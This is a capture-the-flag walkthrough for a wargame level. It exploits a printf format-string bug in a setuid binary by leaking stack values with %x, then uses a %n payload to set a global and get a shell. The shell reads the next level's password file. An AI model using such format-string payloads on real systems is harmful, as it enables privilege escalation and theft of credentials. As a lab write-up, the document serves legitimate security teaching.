level3 - walkthrough
====================

Target: /home/user/level3/level3   (setuid + setgid level4)
Goal:   read /home/user/level4/.pass

1. Recon (objdump -d level3), function v():
     fgets(buf, 0x200, stdin)      ; buf = ebp-0x208
     printf(buf)                   ; <-- format string vuln (no format arg!)
     mov 0x804988c,%eax ; cmp $0x40,%eax   ; if (m == 0x40)
       fwrite("Wait what?!\n"); system("/bin/sh")
   `m` is a 4-byte global in .bss at 0x0804988c (objdump -t).

2. The bug
   printf(buf) treats attacker input as the format string. %n writes the number
   of characters printed so far to an address taken from the stack. We aim %n
   at `m` and arrange for exactly 0x40 (64) characters to have been printed.

3. Find where our input sits on printf's argument list
     $ python -c 'print "AAAA" + ".%x"*12' | ./level3
       AAAA.200.b7fd1ac0.b7ff37d0.41414141. ...
   The marker 0x41414141 shows up as the 4th value -> our buffer begins at
   format-argument position 4. So `%4$n` dereferences the 4 bytes at the very
   start of our input.

4. Build the payload
     [ &m = \x8c\x98\x04\x08 ]  4 bytes, printed literally (4 chars)
     %60x                       consume arg#1, print it padded to 60 chars
     %4$n                       write (4 + 60 = 64 = 0x40) into *(&m)
   -> m becomes 0x40, so v() runs system("/bin/sh").

5. Driving the shell
   system("/bin/sh") reads commands from stdin, but fgets() already buffered
   ahead from the pipe. Feed the command after a short pause so fgets' read()
   only grabs the payload line, leaving the command in the pipe for the shell:

     ( python -c 'import sys;sys.stdout.write("\x8c\x98\x04\x08%60x%4$n\n")'
       sleep 1
       echo "cat /home/user/level4/.pass" ) | ./level3

   (Interactively you can instead do `(python -c '...'; cat) | ./level3` and
    type the command yourself.)

